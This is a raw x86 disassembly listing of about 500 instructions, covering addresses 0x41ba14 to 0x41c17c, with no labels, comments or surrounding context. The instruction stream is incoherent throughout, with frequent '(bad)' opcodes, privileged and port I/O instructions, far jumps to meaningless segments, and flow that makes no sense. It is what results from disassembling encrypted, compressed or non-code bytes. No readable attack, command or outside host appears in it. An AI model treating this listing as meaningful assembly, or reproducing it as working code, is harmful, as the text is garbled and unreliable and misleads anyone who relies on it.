  41ba14:	inc    esp
  41ba15:	cmp    eax,0x4cb1df69
  41ba1a:	(bad)  
  41ba1b:	mov    edi,0x46d604a5
  41ba20:	xchg   esp,eax
  41ba21:	mov    eax,ds:0x9f16646b
  41ba26:	jmp    0x41ba55
  41ba28:	mov    eax,ds:0xfc4fc003
  41ba2d:	xor    cl,bh
  41ba2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba30:	mov    cl,BYTE PTR [ebp-0x6]
  41ba33:	mov    ds:0x4d36761c,eax
  41ba38:	aaa    
  41ba39:	jp     0x41baaa
  41ba3b:	fucomip st,st(2)
  41ba3d:	push   eax
  41ba3e:	lods   eax,DWORD PTR ds:[esi]
  41ba3f:	inc    ebx
  41ba40:	scas   eax,DWORD PTR es:[edi]
  41ba41:	data16 mov dh,0xa9
  41ba44:	and    BYTE PTR [edi+0x5f],0x59
  41ba48:	mov    edx,0xe4074840
  41ba4d:	gs mov dl,0x79
  41ba50:	fst    st(5)
  41ba52:	add    ah,BYTE PTR [ebp-0x4f055459]
  41ba58:	and    DWORD PTR [esi],esp
  41ba5a:	sub    BYTE PTR [edx+0x4c47485],bl
  41ba60:	push   0xc6f95503
  41ba65:	dec    esi
  41ba66:	icebp  
  41ba67:	sbb    al,0xe0
  41ba69:	or     eax,0x3e7263aa
  41ba6e:	xor    ebx,edx
  41ba70:	xchg   ebx,eax
  41ba71:	mov    WORD PTR [edi],ss
  41ba73:	icebp  
  41ba74:	add    ecx,DWORD PTR [edi+0x41]
  41ba77:	mov    dh,0xeb
  41ba79:	or     ebx,ecx
  41ba7b:	inc    ebp
  41ba7c:	inc    ecx
  41ba7d:	ficom  DWORD PTR [ebx*4-0x78545b09]
  41ba84:	push   esp
  41ba85:	add    al,0xca
  41ba87:	jp     0x41bad7
  41ba89:	fwait
  41ba8a:	ins    DWORD PTR es:[edi],dx
  41ba8b:	aad    0xb6
  41ba8d:	leave  
  41ba8e:	aam    0x5
  41ba90:	ret    0xc896
  41ba93:	(bad)  
  41ba94:	repz stc 
  41ba96:	popa   
  41ba97:	popa   
  41ba98:	stos   BYTE PTR es:[edi],al
  41ba99:	enter  0x2baa,0x56
  41ba9d:	mov    dh,0x35
  41ba9f:	fidiv  DWORD PTR [esi+0xd57db63]
  41baa5:	mov    BYTE PTR [edi],dh
  41baa7:	ret    0x13f2
  41baaa:	push   cs
  41baab:	xor    BYTE PTR [eax+0x3662cc58],bh
  41bab1:	pusha  
  41bab2:	jne    0x41ba91
  41bab4:	fstp   DWORD PTR [esi-0x491b4a6a]
  41baba:	loopne 0x41bb00
  41babc:	loope  0x41bb37
  41babe:	outs   dx,BYTE PTR ds:[esi]
  41babf:	or     BYTE PTR [ecx],0xd3
  41bac2:	inc    eax
  41bac3:	sti    
  41bac4:	jecxz  0x41ba78
  41bac6:	repnz push esp
  41bac8:	pop    eax
  41bac9:	inc    ecx
  41baca:	and    edi,DWORD PTR [eax+0x734467a7]
  41bad0:	das    
  41bad1:	or     ch,BYTE PTR [ecx-0x1074efa2]
  41bad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bad8:	add    ebx,DWORD PTR [ebx-0x7481b9ab]
  41bade:	retf   
  41badf:	cdq    
  41bae0:	sub    dl,ch
  41bae2:	adc    BYTE PTR [edx+0x5f7e480],ah
  41bae8:	rcl    ch,0x9b
  41baeb:	inc    eax
  41baec:	aam    0x62
  41baee:	push   0x9245ee3f
  41baf3:	(bad)  
  41baf5:	push   0x15ec0a66
  41bafa:	push   0xcfb6ffb4
  41baff:	cmp    ecx,ecx
  41bb01:	pusha  
  41bb02:	xchg   esi,eax
  41bb03:	fadd   DWORD PTR [edi]
  41bb05:	sbb    ax,0x48fc
  41bb09:	retf   0x3af9
  41bb0c:	fcomp  QWORD PTR [ebp+0x6e1cf1e]
  41bb12:	and    DWORD PTR [edx],0x57
  41bb15:	stos   BYTE PTR es:[edi],al
  41bb16:	inc    esi
  41bb17:	jp     0x41bafd
  41bb19:	jle    0x41bb47
  41bb1b:	popf   
  41bb1c:	outs   dx,DWORD PTR ds:[esi]
  41bb1d:	xor    ch,BYTE PTR [ebx]
  41bb1f:	cmc    
  41bb20:	std    
  41bb21:	fs enter 0x7baf,0x9f
  41bb26:	out    0xd1,al
  41bb28:	inc    edi
  41bb29:	xchg   DWORD PTR [eax-0x1b02d743],edx
  41bb2f:	push   0xffffff87
  41bb31:	xchg   edi,eax
  41bb32:	or     eax,0x7db21c2b
  41bb37:	dec    ebx
  41bb38:	sbb    al,BYTE PTR [ecx]
  41bb3a:	pop    esi
  41bb3b:	rcr    DWORD PTR [esi],1
  41bb3d:	fisubr DWORD PTR [ecx-0x3a]
  41bb40:	adc    esp,DWORD PTR [eax]
  41bb42:	fstp   TBYTE PTR [eax]
  41bb44:	inc    ebp
  41bb45:	loope  0x41bb05
  41bb47:	push   ss
  41bb48:	inc    ecx
  41bb49:	inc    esi
  41bb4a:	sbb    al,0xe0
  41bb4c:	repnz adc dh,BYTE PTR [eax]
  41bb4f:	adc    al,bl
  41bb51:	jbe    0x41bb0d
  41bb53:	mov    bl,0x2c
  41bb55:	jg     0x41baf0
  41bb57:	mov    ah,0xde
  41bb59:	popf   
  41bb5a:	pop    ss
  41bb5b:	mov    dl,0x66
  41bb5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb5e:	dec    eax
  41bb5f:	add    al,0x68
  41bb61:	mov    bl,0xa9
  41bb63:	mov    esp,DWORD PTR [edx+esi*4]
  41bb66:	std    
  41bb67:	inc    esi
  41bb68:	push   es
  41bb69:	jae    0x41bb5e
  41bb6b:	fwait
  41bb6c:	cdq    
  41bb6d:	(bad)  
  41bb6e:	cmp    al,0x1
  41bb70:	xchg   esp,eax
  41bb71:	sbb    DWORD PTR [edx+0x77],ebx
  41bb74:	mov    cl,0xb6
  41bb76:	jmp    0xfeac:0xb6b71a53
  41bb7d:	mov    esp,0xc8de4233
  41bb82:	push   ecx
  41bb83:	rcr    ah,1
  41bb85:	or     al,0x35
  41bb87:	in     al,0xc4
  41bb89:	fld    st(5)
  41bb8b:	and    eax,0x9fcd560a
  41bb90:	sbb    BYTE PTR [esi+0x62bbe371],dh
  41bb96:	dec    edi
  41bb97:	retf   0x3043
  41bb9a:	arpl   WORD PTR [eax-0x71046e1],ax
  41bba0:	mov    ecx,0x87b20f6a
  41bba5:	cmp    eax,ecx
  41bba7:	scas   eax,DWORD PTR es:[edi]
  41bba8:	mov    eax,ds:0xdd277076
  41bbad:	push   ebx
  41bbae:	pop    edx
  41bbaf:	mov    eax,0xccdb1320
  41bbb4:	dec    ebp
  41bbb5:	sbb    dl,BYTE PTR [ecx+0x411c3222]
  41bbbb:	cli    
  41bbbc:	(bad)  
  41bbbd:	ins    DWORD PTR es:[edi],dx
  41bbbe:	and    edx,DWORD PTR [edx]
  41bbc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbc1:	push   eax
  41bbc2:	jb     0x41bb52
  41bbc4:	pop    DWORD PTR ds:0xd50b3a5
  41bbca:	cmp    bl,BYTE PTR [ebx+0x47]
  41bbcd:	out    dx,eax
  41bbce:	jecxz  0x41bc0e
  41bbd0:	gs je  0x41bbed
  41bbd3:	push   ebx
  41bbd4:	pop    ebx
  41bbd5:	loopne 0x41bb62
  41bbd7:	push   edx
  41bbd8:	xor    cl,dl
  41bbda:	jg     0x41bc49
  41bbdc:	add    al,0x30
  41bbde:	pop    ebx
  41bbdf:	or     eax,ebp
  41bbe1:	shl    BYTE PTR [edi],0x20
  41bbe4:	add    esp,DWORD PTR [eax+esi*8-0x3b]
  41bbe8:	push   cs
  41bbe9:	out    0xc7,al
  41bbeb:	mov    bl,0xea
  41bbed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbee:	jmp    0x4958:0x53549777
  41bbf5:	dec    eax
  41bbf6:	retf   0x76e4
  41bbf9:	adc    al,0x56
  41bbfb:	inc    edx
  41bbfc:	mov    ecx,0x86613270
  41bc01:	scas   al,BYTE PTR es:[edi]
  41bc02:	in     eax,0xf5
  41bc04:	pop    es
  41bc05:	lods   eax,DWORD PTR ds:[esi]
  41bc06:	out    dx,al
  41bc07:	clc    
  41bc08:	or     BYTE PTR [eax],cl
  41bc0a:	iret   
  41bc0b:	push   ds
  41bc0c:	xor    eax,0x3c7b85cf
  41bc11:	or     eax,0x5cb75756
  41bc16:	dec    edi
  41bc17:	add    esp,edi
  41bc19:	mov    eax,0xdb656930
  41bc1e:	icebp  
  41bc1f:	fwait
  41bc20:	cmp    BYTE PTR [edx+0x35],cl
  41bc23:	xchg   edi,eax
  41bc24:	iret   
  41bc25:	stos   BYTE PTR es:[edi],al
  41bc26:	mov    edi,edi
  41bc28:	or     DWORD PTR [ebx+0xe],0xffffffa6
  41bc2c:	ret    0x2f6e
  41bc2f:	inc    esp
  41bc30:	ins    DWORD PTR es:[edi],dx
  41bc31:	es jmp 0x41bc1c
  41bc34:	daa    
  41bc35:	jle    0x41bc63
  41bc37:	xchg   DWORD PTR [edx+0x38],esi
  41bc3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc3b:	add    eax,0xc9ee839b
  41bc40:	stos   DWORD PTR es:[edi],eax
  41bc41:	xchg   DWORD PTR [esi],esi
  41bc43:	mov    ah,0x72
  41bc45:	je     0x41bc34
  41bc47:	add    ch,ah
  41bc49:	sbb    al,0x98
  41bc4b:	cmp    eax,0x9691d9a7
  41bc50:	jecxz  0x41bcba
  41bc52:	shl    BYTE PTR [ebx-0x3e7f3e33],1
  41bc58:	jle    0x41bcc8
  41bc5a:	ins    BYTE PTR es:[edi],dx
  41bc5b:	dec    edx
  41bc5c:	mov    ebx,0xa2fd4
  41bc61:	ret    
  41bc62:	pusha  
  41bc63:	inc    edi
  41bc64:	(bad)  
  41bc65:	test   BYTE PTR [edx],ah
  41bc67:	jmp    esi
  41bc69:	ins    BYTE PTR es:[edi],dx
  41bc6a:	mov    eax,ds:0x1e998089
  41bc6f:	mov    ds:0x1c45c082,al
  41bc74:	mov    edx,DWORD PTR [ebx]
  41bc76:	pop    esi
  41bc77:	dec    edx
  41bc78:	lods   al,BYTE PTR ds:[esi]
  41bc79:	or     al,0x38
  41bc7b:	fwait
  41bc7c:	sbb    BYTE PTR [edi-0x3],bh
  41bc7f:	dec    esi
  41bc80:	fst    QWORD PTR [eax+0x499cf6a9]
  41bc86:	popf   
  41bc87:	adc    al,BYTE PTR [edi+0x1bcf0dc7]
  41bc8d:	dec    ebp
  41bc8e:	jmp    0xd6f8:0xd0583d4b
  41bc95:	inc    eax
  41bc96:	jle    0x41bd0d
  41bc98:	loop   0x41bc45
  41bc9a:	std    
  41bc9b:	and    eax,0xe0e18345
  41bca0:	stos   BYTE PTR es:[edi],al
  41bca1:	repz jmp 0x2c30:0xa1962e17
  41bca9:	popa   
  41bcaa:	xor    bl,BYTE PTR [esi]
  41bcac:	xor    edx,DWORD PTR [eax+0x35d7652a]
  41bcb2:	test   al,0xef
  41bcb4:	mov    ds:0xa3291f1d,al
  41bcb9:	(bad)  
  41bcba:	loopne 0x41bc41
  41bcbc:	jecxz  0x41bc40
  41bcbe:	jbe    0x41bd2e
  41bcc0:	stos   DWORD PTR es:[edi],eax
  41bcc1:	fwait
  41bcc2:	mov    ecx,0x553c08ba
  41bcc7:	ds jnp 0x41bcdf
  41bcca:	cs mov esi,0xdf6f8c0f
  41bcd0:	inc    edx
  41bcd1:	dec    eax
  41bcd2:	fwait
  41bcd3:	ret    
  41bcd4:	sbb    eax,0xe483c699
  41bcd9:	sub    BYTE PTR [esi],bl
  41bcdb:	add    eax,0x3dd6b9d2
  41bce0:	leave  
  41bce1:	push   ebp
  41bce2:	and    al,0x5a
  41bce4:	das    
  41bce5:	into   
  41bce6:	(bad)  
  41bce8:	daa    
  41bce9:	rol    ebx,1
  41bceb:	cmp    al,0x78
  41bced:	dec    ebp
  41bcee:	sbb    eax,0x3e016853
  41bcf3:	les    eax,FWORD PTR [ebp+0x5e]
  41bcf6:	push   ss
  41bcf7:	gs jmp 0x22ad:0x9e5a25b3
  41bcff:	mov    eax,0x624be15
  41bd04:	dec    edi
  41bd05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd06:	add    ebp,DWORD PTR [edx]
  41bd08:	mov    ebp,0xb588bee8
  41bd0d:	sub    eax,0xf151aa8b
  41bd12:	mov    BYTE PTR [eax+0x56c1a1ae],al
  41bd18:	outs   dx,DWORD PTR ds:[esi]
  41bd19:	add    ebx,DWORD PTR [eax-0xb]
  41bd1c:	imul   esi,DWORD PTR [eax-0x22e6c31b],0x25
  41bd23:	daa    
  41bd24:	mov    esp,0x31b1b53e
  41bd29:	push   0x1fcaa344
  41bd2e:	rcl    bh,0x6a
  41bd31:	add    al,0xb2
  41bd33:	sbb    dl,ch
  41bd35:	sahf   
  41bd36:	xchg   DWORD PTR [esi],esi
  41bd38:	icebp  
  41bd39:	fnstenv [eax-0x64564559]
  41bd3f:	in     al,0x6d
  41bd41:	xlat   BYTE PTR ds:[ebx]
  41bd42:	push   es
  41bd43:	pop    esi
  41bd44:	into   
  41bd45:	sbb    al,BYTE PTR [ecx+0x5a]
  41bd48:	pusha  
  41bd49:	mov    ecx,0xc19fd067
  41bd4e:	xor    dl,BYTE PTR [edx+edi*8+0x3086449f]
  41bd55:	mov    bh,0x2f
  41bd57:	(bad)  [ebx-0x6a]
  41bd5a:	inc    edx
  41bd5b:	in     al,dx
  41bd5c:	jle    0x41bd79
  41bd5e:	fs (bad) 
  41bd60:	sahf   
  41bd61:	faddp  st(6),st
  41bd63:	or     al,BYTE PTR [ecx]
  41bd65:	inc    edi
  41bd66:	mov    al,0x46
  41bd68:	xchg   edx,eax
  41bd69:	ins    BYTE PTR es:[edi],dx
  41bd6a:	sar    BYTE PTR [edi],1
  41bd6c:	add    eax,0x19c876b2
  41bd71:	xchg   edx,eax
  41bd72:	stos   BYTE PTR es:[edi],al
  41bd73:	xchg   BYTE PTR [ebp+0x4f],dh
  41bd76:	pop    ss
  41bd77:	cdq    
  41bd78:	popf   
  41bd79:	xor    BYTE PTR [ebx],ah
  41bd7b:	lods   al,BYTE PTR ds:[esi]
  41bd7c:	loopne 0x41bd03
  41bd7e:	pop    edx
  41bd7f:	shl    bh,cl
  41bd81:	push   edi
  41bd82:	inc    eax
  41bd83:	loope  0x41bd99
  41bd85:	mov    al,0xd7
  41bd87:	(bad)  
  41bd88:	leave  
  41bd89:	mov    edi,0x9f688fb0
  41bd8e:	and    esp,DWORD PTR [esi-0x43]
  41bd91:	mov    ds:0x84231171,eax
  41bd96:	sub    ah,dl
  41bd98:	popf   
  41bd99:	repnz and BYTE PTR [edx+0x46],bh
  41bd9d:	sub    BYTE PTR [eax-0x5d],dl
  41bda0:	int3   
  41bda1:	mov    eax,0xc6063d6a
  41bda6:	dec    edi
  41bda7:	test   al,0xf1
  41bda9:	cmovo  esi,DWORD PTR ds:0xb6b91a1
  41bdb0:	adc    ch,BYTE PTR cs:[ecx+0x25]
  41bdb4:	sti    
  41bdb5:	jne    0x41bdbf
  41bdb7:	cmp    bh,ah
  41bdb9:	mov    al,ds:0x8f2e1b6c
  41bdbe:	xchg   ebp,eax
  41bdbf:	dec    ecx
  41bdc0:	aad    0x66
  41bdc2:	push   ss
  41bdc3:	je     0x41bd88
  41bdc5:	mov    ecx,0x59c9c2d
  41bdca:	add    eax,0x4b61826a
  41bdcf:	bound  esp,QWORD PTR [esi+0x594f2118]
  41bdd5:	nop
  41bdd6:	arpl   WORD PTR [edi-0x3c],sp
  41bdd9:	add    BYTE PTR [ebp-0x44],ch
  41bddc:	sub    al,0xea
  41bdde:	jo     0x41be4f
  41bde0:	sti    
  41bde1:	dec    ebp
  41bde2:	jmp    0x41bd8f
  41bde4:	add    BYTE PTR [edi+0x3ae4230d],0xf6
  41bdeb:	sub    edx,DWORD PTR [ecx+0x58520c00]
  41bdf1:	dec    ebx
  41bdf2:	xchg   ebx,eax
  41bdf3:	mov    al,0x15
  41bdf5:	pop    ebx
  41bdf6:	into   
  41bdf7:	or     eax,0x23c91e26
  41bdfc:	add    ebp,ebx
  41bdfe:	loope  0x41bdf3
  41be00:	imul   edi,DWORD PTR [ecx+0x3ca84fd6],0x3b
  41be07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be08:	dec    ebp
  41be09:	push   ecx
  41be0a:	sbb    ebx,DWORD PTR [ebx-0x73020261]
  41be10:	add    DWORD PTR [edx+ebx*1-0x2c],ebx
  41be14:	cdq    
  41be15:	xchg   DWORD PTR [edx+0x67],esp
  41be18:	inc    esi
  41be19:	imul   esi,DWORD PTR [eax],0xe601eed1
  41be1f:	add    al,0xa3
  41be21:	jne    0x41be10
  41be23:	pop    edx
  41be24:	jge    0x41be59
  41be26:	mov    ds:0x45055b95,al
  41be2b:	push   0xb502c650
  41be30:	xor    esi,edi
  41be32:	ja     0x41be93
  41be34:	add    al,0xc3
  41be36:	inc    eax
  41be37:	and    eax,0xfd5997e8
  41be3c:	mov    eax,0x5cff31c
  41be41:	mov    fs,edi
  41be43:	mov    dh,0x9a
  41be45:	imul   DWORD PTR [esi]
  41be47:	cwde   
  41be48:	or     DWORD PTR [edi+0x7776115],0xe043b243
  41be52:	test   eax,0x84f859b5
  41be57:	popf   
  41be58:	jne    0x41be81
  41be5a:	jmp    0xd4b195d
  41be5f:	shl    DWORD PTR [esi],1
  41be61:	pop    esp
  41be62:	aam    0xce
  41be64:	jb     0x41be57
  41be66:	inc    ecx
  41be67:	(bad)  
  41be68:	shl    BYTE PTR [edi-0x31],1
  41be6b:	ins    BYTE PTR es:[edi],dx
  41be6c:	pop    ds
  41be6d:	jns    0x41bdf2
  41be6f:	xor    esp,edi
  41be71:	xor    ebp,esp
  41be73:	cmp    eax,0x73bcb109
  41be78:	(bad)  
  41be79:	test   DWORD PTR [ebx-0x40],eax
  41be7c:	jne    0x41be59
  41be7e:	xchg   edi,eax
  41be7f:	and    esp,ebx
  41be81:	and    al,0xe0
  41be83:	sub    ah,BYTE PTR [ebp-0x44880f2b]
  41be89:	cwd    
  41be8b:	adc    ah,BYTE PTR [edi+0x0]
  41be8e:	pop    edx
  41be8f:	mov    esp,0x717a0002
  41be94:	or     bh,BYTE PTR [ecx-0x15]
  41be97:	pop    esi
  41be98:	adc    esp,DWORD PTR ds:0xf4c518ee
  41be9e:	or     cl,BYTE PTR [esp+edi*2-0x3d10ef1d]
  41bea5:	fdiv   QWORD PTR [esi+0x71]
  41bea8:	add    BYTE PTR [edi-0x35be18a1],0xdc
  41beaf:	jne    0x41bf2b
  41beb1:	sbb    BYTE PTR [ebx+0x36604257],dh
  41beb7:	inc    eax
  41beb8:	mov    ss,WORD PTR [ecx+0x2507be6c]
  41bebe:	frstor [edx]
  41bec0:	in     eax,dx
  41bec1:	fiadd  DWORD PTR [edx-0x42]
  41bec4:	jmp    DWORD PTR [edx+0x21dd3a7e]
  41beca:	pop    es
  41becb:	xor    BYTE PTR [edi-0x55010e1a],dh
  41bed1:	add    esp,DWORD PTR [edx]
  41bed3:	jnp    0x41bee7
  41bed5:	iret   
  41bed6:	xchg   ebp,eax
  41bed7:	bound  edi,QWORD PTR ds:0xc2277e31
  41bedd:	xchg   ebx,eax
  41bede:	(bad)  
  41bedf:	mov    esi,0x4fac921e
  41bee4:	fcmovu st,st(4)
  41bee6:	pop    ecx
  41bee7:	imul   ebx,DWORD PTR [edi+0x54c6b7c6],0x57f9a0df
  41bef1:	call   0x6f82:0xda6f4bab
  41bef8:	cmp    al,dh
  41befa:	(bad)  
  41befb:	hlt    
  41befc:	leave  
  41befd:	xchg   edi,eax
  41befe:	jns    0x41be9b
  41bf00:	jp     0x41bf28
  41bf02:	sbb    al,0xb4
  41bf04:	(bad)  
  41bf05:	(bad)  [ecx+ebp*2]
  41bf08:	xchg   edi,eax
  41bf09:	pop    ds
  41bf0a:	add    DWORD PTR [edi],edi
  41bf0c:	cli    
  41bf0d:	inc    esi
  41bf0e:	mov    al,ds:0x6192a0fa
  41bf13:	push   0xd44b65e
  41bf18:	pop    esp
  41bf19:	or     cl,BYTE PTR [eax+0x6c]
  41bf1c:	cld    
  41bf1d:	lds    edi,FWORD PTR [esi+edi*1+0x54]
  41bf21:	lea    ebp,[esi-0x4ad0b22d]
  41bf27:	pop    ecx
  41bf28:	cmc    
  41bf29:	or     eax,0xfdba4c86
  41bf2e:	retf   0x6d12
  41bf31:	in     al,0xb1
  41bf33:	jnp    0x41bf51
  41bf35:	inc    ecx
  41bf36:	push   edi
  41bf37:	outs   dx,DWORD PTR ds:[esi]
  41bf38:	in     eax,dx
  41bf39:	int    0x21
  41bf3b:	fsub   DWORD PTR [ebx-0x244c3088]
  41bf41:	jmp    0x33c196d0
  41bf46:	push   ebp
  41bf47:	pop    ebp
  41bf48:	ret    0x1f6d
  41bf4b:	aam    0xff
  41bf4d:	sub    DWORD PTR [eax+0x3e8e3e0],edx
  41bf53:	into   
  41bf54:	loopne 0x41bf6a
  41bf56:	xchg   BYTE PTR [edx+0x8a8242],dh
  41bf5c:	ds jbe 0x41beee
  41bf5f:	sub    bl,BYTE PTR [ebp+0x45d2b78a]
  41bf65:	mov    bh,0x7b
  41bf67:	out    0xa5,al
  41bf69:	xchg   esi,eax
  41bf6a:	cmp    BYTE PTR [ecx+0x712bbe4c],0xe5
  41bf71:	(bad)  
  41bf72:	loop   0x41bf22
  41bf74:	cdq    
  41bf75:	and    dh,ch
  41bf77:	xor    ch,BYTE PTR [ebx]
  41bf79:	cwde   
  41bf7a:	call   0xe6b3701f
  41bf7f:	mov    edx,0x7e5903db
  41bf84:	(bad)  
  41bf85:	cld    
  41bf86:	xchg   edx,eax
  41bf87:	iret   
  41bf88:	adc    edi,DWORD PTR [eax-0x4b]
  41bf8b:	adc    ah,al
  41bf8d:	loopne 0x41bf5d
  41bf8f:	adc    eax,0x1c282398
  41bf94:	xor    eax,0x35e319bf
  41bf99:	(bad)  
  41bf9a:	cmp    al,0x30
  41bf9c:	out    dx,al
  41bf9d:	sub    al,0xee
  41bf9f:	stos   BYTE PTR es:[edi],al
  41bfa0:	js     0x41bf37
  41bfa2:	or     dh,BYTE PTR [eax]
  41bfa4:	sar    BYTE PTR [ebp+0x16],1
  41bfa7:	mov    ebp,DWORD PTR [ebx]
  41bfa9:	stos   DWORD PTR es:[edi],eax
  41bfaa:	or     al,0xb8
  41bfac:	xchg   ebx,esi
  41bfae:	xor    al,ch
  41bfb0:	inc    esi
  41bfb1:	loopne 0x41bfdd
  41bfb3:	test   cl,0xc3
  41bfb6:	lahf   
  41bfb7:	lahf   
  41bfb8:	jecxz  0x41bf94
  41bfba:	cld    
  41bfbb:	clc    
  41bfbc:	mov    DWORD PTR [ecx],ebp
  41bfbe:	addr16 xchg ebp,eax
  41bfc0:	test   eax,0x4681f508
  41bfc5:	cwde   
  41bfc6:	ja     0x41bf8e
  41bfc8:	mov    ch,BYTE PTR [edx+ebp*8-0x7b]
  41bfcc:	add    cl,BYTE PTR [ecx+edx*8]
  41bfcf:	das    
  41bfd0:	adc    esp,DWORD PTR [ebx-0x68401d86]
  41bfd6:	xchg   ebp,eax
  41bfd7:	rol    DWORD PTR [esi],1
  41bfd9:	popf   
  41bfda:	pop    ebx
  41bfdb:	out    dx,al
  41bfdc:	out    0x95,eax
  41bfde:	xchg   ebx,eax
  41bfdf:	push   esp
  41bfe0:	repnz leave 
  41bfe2:	test   BYTE PTR [ecx],dl
  41bfe4:	push   ecx
  41bfe5:	jmp    0x274da3b3
  41bfea:	and    esi,edi
  41bfec:	sti    
  41bfed:	data16 je 0x41c004
  41bff0:	cmp    ah,al
  41bff2:	cmp    eax,0x740df700
  41bff7:	pop    ebp
  41bff8:	add    DWORD PTR [esi+0x1c985104],esi
  41bffe:	xchg   esi,eax
  41bfff:	das    
  41c000:	pop    esi
  41c001:	mov    ebx,0xb1f95d76
  41c006:	imul   edi,esp,0xb323624d
  41c00c:	lods   eax,DWORD PTR ds:[esi]
  41c00d:	push   ds
  41c00e:	pop    es
  41c00f:	xor    ah,BYTE PTR [ecx]
  41c011:	fsubr  st(0),st
  41c013:	pop    ebx
  41c014:	aaa    
  41c015:	loopne 0x41bfaa
  41c017:	push   edi
  41c018:	adc    DWORD PTR [ecx-0x2abcf3f3],0x3e06f2f9
  41c022:	mov    edx,0x68b2e25c
  41c027:	jae    0x41bffb
  41c029:	aam    0x41
  41c02b:	xchg   ecx,eax
  41c02c:	jae    0x41c058
  41c02e:	dec    eax
  41c02f:	xor    DWORD PTR [ecx-0xff03b70],edi
  41c035:	dec    eax
  41c036:	inc    esp
  41c037:	dec    ebx
  41c038:	shl    DWORD PTR [edx],cl
  41c03a:	sub    BYTE PTR [edx-0x66],bh
  41c03d:	mov    ebx,gs
  41c03f:	hlt    
  41c040:	push   esp
  41c041:	inc    ecx
  41c042:	sbb    eax,0xa6b3d8e9
  41c047:	dec    eax
  41c048:	mov    ds:0xf0a71509,eax
  41c04d:	xor    eax,0x5dc00240
  41c052:	mov    eax,0x9b9b8e87
  41c057:	ret    
  41c058:	punpckhbw mm0,QWORD PTR [esi+ecx*8+0x5b3673d1]
  41c060:	fimul  DWORD PTR [ebx+0x55a7c045]
  41c066:	cmp    al,0x72
  41c069:	icebp  
  41c06a:	fwait
  41c06b:	inc    edx
  41c06c:	mov    WORD PTR [ecx+0x148dc0b1],?
  41c072:	jbe    0x41c0ce
  41c074:	adc    eax,0x96f73950
  41c079:	mov    ah,0xdc
  41c07b:	mov    cl,0x9f
  41c07d:	gs ds jnp 0x41c019
  41c081:	dec    ebp
  41c082:	lock mov bl,BYTE PTR [edi]
  41c085:	ret    
  41c086:	inc    eax
  41c087:	(bad)  
  41c088:	add    BYTE PTR [esp+ebx*2+0x5da199b7],dh
  41c08f:	repz mov cl,0xd9
  41c092:	mov    bh,0x57
  41c094:	pop    ebp
  41c095:	sbb    esi,ebp
  41c097:	ins    BYTE PTR es:[edi],dx
  41c098:	xchg   ebx,eax
  41c099:	adc    al,cl
  41c09b:	rcr    bh,cl
  41c09d:	pop    ebp
  41c09e:	aad    0x22
  41c0a0:	xchg   ebx,eax
  41c0a1:	push   ecx
  41c0a2:	mov    ch,0x88
  41c0a4:	dec    ebx
  41c0a5:	mul    DWORD PTR [ecx+esi*2-0x61]
  41c0a9:	cmp    eax,0x8ac8ade
  41c0ae:	xor    ecx,0xffffffc4
  41c0b1:	xor    bl,BYTE PTR [edi]
  41c0b3:	xor    al,0x66
  41c0b5:	adc    al,BYTE PTR [ebp-0x78f4df83]
  41c0bb:	out    dx,eax
  41c0bc:	sub    ebx,DWORD PTR [ebx+0x3c4f40e6]
  41c0c2:	cmp    DWORD PTR [ebx-0x17],edx
  41c0c5:	mov    dh,0xab
  41c0c7:	jbe    0x41c0c1
  41c0c9:	sbb    esp,DWORD PTR [esi+0x68]
  41c0cc:	push   edi
  41c0cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0ce:	retf   
  41c0cf:	mov    ah,0x0
  41c0d1:	mov    esp,0xd4c647b
  41c0d6:	clc    
  41c0d7:	mov    WORD PTR [eax],ss
  41c0d9:	ficom  WORD PTR [esi-0x3d55c17f]
  41c0df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0e0:	stc    
  41c0e1:	jg     0x41c07d
  41c0e3:	mov    ds:0xda648227,eax
  41c0e8:	xlat   BYTE PTR ds:[ebx]
  41c0e9:	(bad)  ds:0x7ff2404d
  41c0ef:	rol    edi,cl
  41c0f1:	or     eax,0xf0f1339d
  41c0f6:	fadd   st,st(6)
  41c0f8:	pop    esi
  41c0f9:	mov    ds:0x323de987,eax
  41c0fe:	aad    0xf
  41c100:	mov    edi,0x45345a00
  41c105:	pusha  
  41c106:	ja     0x41c0ec
  41c108:	add    DWORD PTR [eax+0x6b],eax
  41c10b:	jnp    0x41c0ca
  41c10d:	out    0x2f,al
  41c10f:	nop
  41c110:	sbb    BYTE PTR [ebx],al
  41c112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c113:	and    ebp,DWORD PTR [si+0x58]
  41c117:	aas    
  41c118:	lock imul ecx,DWORD PTR ss:[edi+0x77f1aa7d],0x295efbc1
  41c124:	push   edi
  41c125:	inc    edi
  41c126:	mov    ecx,?
  41c128:	sub    bh,ah
  41c12a:	(bad)  
  41c12b:	jmp    0x41c127
  41c12d:	das    
  41c12e:	jp     0x41c14e
  41c130:	adc    esi,edx
  41c132:	and    eax,0x361a15d0
  41c137:	scas   eax,DWORD PTR es:[edi]
  41c138:	inc    eax
  41c139:	ret    
  41c13a:	hlt    
  41c13b:	lahf   
  41c13c:	adc    edi,DWORD PTR [eax+0x2eb96a6c]
  41c142:	std    
  41c143:	dec    esp
  41c144:	sbb    BYTE PTR [bx+si+0x47],ah
  41c148:	leave  
  41c149:	sub    ebp,DWORD PTR ds:0xbd7c149e
  41c14f:	mov    al,0xf2
  41c151:	ins    DWORD PTR es:[edi],dx
  41c152:	xor    DWORD PTR [ebx],ebp
  41c154:	add    BYTE PTR [edx+esi*8-0xf],bh
  41c158:	lea    esi,[ebx+ecx*1-0x7]
  41c15c:	adc    DWORD PTR [esi+0x64],edi
  41c15f:	out    dx,al
  41c160:	aad    0x44
  41c162:	mov    edi,0x44f4c883
  41c167:	fidivr WORD PTR [edx+0x21a6766e]
  41c16d:	scas   al,BYTE PTR es:[edi]
  41c16e:	add    esi,DWORD PTR [ebp-0x40]
  41c171:	push   0x6c0d6dc5
  41c176:	mov    ss,WORD PTR [esi+0x3f6fe7c0]
  41c17c:	mov    DWORD PTR [edi],esi
